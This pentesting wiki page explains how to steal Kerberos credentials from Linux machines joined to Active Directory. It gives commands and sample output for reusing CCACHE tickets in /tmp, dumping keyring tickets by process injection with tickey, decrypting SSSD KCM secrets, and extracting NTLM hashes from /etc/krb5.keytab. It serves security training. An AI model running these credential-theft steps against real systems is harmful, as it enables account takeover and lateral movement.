# Linux Active Directory

## Theory

A linux machine can also be present inside an Active Directory environment.

A linux machine in an AD might be **storing different CCACHE tickets inside files. This tickets can be used and abused as any other kerberos ticket**. In order to read this tickets you will need to be the user owner of the ticket or **root** inside the machine.

## Practice

{% hint style="info" %}
**Tip: convert ticket to UNIX <-> Windows format**

To convert tickets between UNIX/Windows format with [ticketConverter.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py).

```bash
# Windows -> UNIX
ticketConverter.py $ticket.kirbi $ticket.ccache

# UNIX -> Windows
ticketConverter.py $ticket.ccache $ticket.kirbi
```
{% endhint %}

### CCACHE ticket reuse from /tmp

{% tabs %}
{% tab title="Reuse tickets" %}
When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions

List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be **reused by setting the environment variable** with `export KRB5CCNAME=/tmp/ticket.ccache`. Kerberos ticket name format is `krb5cc_%{uid}` where uid is the user UID.

```bash
ls /tmp/ | grep krb5cc
krb5cc_1000
krb5cc_1569901113
krb5cc_1569901115

export KRB5CCNAME=/tmp/krb5cc_1569901115
```

{% hint style="info" %}
You may use the ticket using [Pass The Ticket ](../../ad/movement/kerberos/ptt.md)techniques
{% endhint %}
{% endtab %}
{% endtabs %}

### CCACHE ticket reuse from keyring

{% tabs %}
{% tab title="Reuse tickets" %}
Processes may **store kerberos tickets inside their memory**, the [tickey](https://github.com/TarlogicSecurity/tickey) tool can be useful to extract those tickets&#x20;

{% hint style="info" %}
ptrace protection should be disabled in the machine `/proc/sys/kernel/yama/ptrace_scope = 0`&#x20;
{% endhint %}

```bash
# Configuration and build
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release

[root@Lab-LSV01 /]# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in tarlogic[1000] session...
[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
[*] Trying to inject in velociraptor[1120601115] session...
[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
[*] Trying to inject in trex[1120601113] session...
[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
[X] [uid:0] Error retrieving tickets
```
{% endtab %}
{% endtabs %}

### CCACHE ticket reuse from SSSD KCM (Kerberos Cache Manager)

{% tabs %}
{% tab title="Reuse tickets" %}
SSSD maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. By default, the key is only readable if you have **root** permissions.

Invoking [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)  with the --database and --key parameters will parse the database and **decrypt the secrets**.

```bash
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
{% endtab %}
{% endtabs %}

### Extract accounts from /etc/krb5.keytab

The service keys used by services that run as root are usually stored in the keytab file **`/etc/krb5.keytab`**. This service key is the equivalent of the service's password, and must be kept secure.

{% tabs %}
{% tab title="Unix-Like" %}
On Linux you can use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract). We want RC4 HMAC hash to reuse the NLTM hash.

```
python3 keytabextract.py krb5.keytab 
[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
[+] Keytab File successfully imported.
        REALM : DOMAIN
        SERVICE PRINCIPAL : host/computer.domain
        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
```
{% endtab %}

{% tab title="Windows" %}
Use [klist](https://adoptopenjdk.net/?variant=openjdk13\&jvmVariant=hotspot) to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23 is the actual **NT Hash of the user**.

```bash
klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
[...]
[26] Service principal: host/COMPUTER@DOMAIN
	 KVNO: 25
	 Key type: 23
	 Key: 31d6cfe0d16ae931b73c59d7e0c089c0
	 Time stamp: Oct 07,  2019 09:12:02
[...]
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory" %}
